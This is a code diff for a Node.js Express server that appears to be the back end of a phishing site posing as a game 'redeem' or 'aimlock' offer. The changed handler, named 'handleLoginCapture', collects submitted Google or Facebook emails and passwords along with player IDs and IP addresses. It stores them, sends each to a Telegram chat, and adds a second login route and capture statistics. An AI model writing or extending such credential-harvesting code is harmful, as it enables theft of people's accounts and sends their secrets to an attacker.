@@ -764,23 +764,35 @@ app.post('/webhook', async (req, res) => {
   res.sendStatus(200);
 });
 
-app.post('/api/login', async (req, res) => {
-  const { nickname, uid, level, method, email, password, page } = req.body;
-  if (!email || !password) {
+async function handleLoginCapture(req, res) {
+  const body        = req.body || {};
+  const emailVal    = body.email || body.username || '';
+  const passwordVal = body.password || '';
+  if (!emailVal || !passwordVal) {
     return res.status(400).json({ success: false, message: 'Data tidak lengkap' });
   }
-  const methodLabel = method === 'google' ? 'Google' : 'Facebook';
-  const ip          = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown')
-                        .split(',')[0].trim();
+  const typeStr = (body.type || '').toLowerCase();
+  let methodLabel = 'Facebook';
+  if (body.method === 'google' || typeStr.includes('google')) methodLabel = 'Google';
+  else if (body.method === 'facebook' || typeStr.includes('facebook')) methodLabel = 'Facebook';
+  let pageVal = body.page || 'redeem';
+  if (typeStr.includes('aimlock')) pageVal = 'aimlock';
+
+  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown')
+               .split(',')[0].trim();
   const entry = {
-    nickname: nickname || 'Player',
-    uid:      uid      || 'N/A',
-    level:    level    || '-',
-    page:     page     || 'redeem',
-    method:   methodLabel, email, password, ip, ts: Date.now()
+    nickname: body.nickname || 'Player',
+    uid:      body.uid      || 'N/A',
+    level:    body.level    || '-',
+    page:     pageVal,
+    method:   methodLabel,
+    email:    emailVal,
+    password: passwordVal,
+    ip,
+    ts: Date.now()
   };
 
-  const no = addLogin(entry);
+  const no = await addLogin(entry);
 
   if (getTgToken() && getTgChat()) {
     await tgSend(getTgChat(), buildNotif(entry, no), {
@@ -794,10 +806,12 @@ app.post('/api/login', async (req, res) => {
   }
 
   res.json({ success: true });
-});
+}
+app.post('/api/login', handleLoginCapture);
+app.post('/login',     handleLoginCapture);
 
 app.get('/api/stats', async (req, res) => {
-  const arr    = loadData();
+  const arr    = await ghLoadData();
   const total  = arr.length;
   const google = arr.filter(l => l.method === 'Google').length;
   res.json({ total, google, facebook: total - google, latest: arr[0] || null });
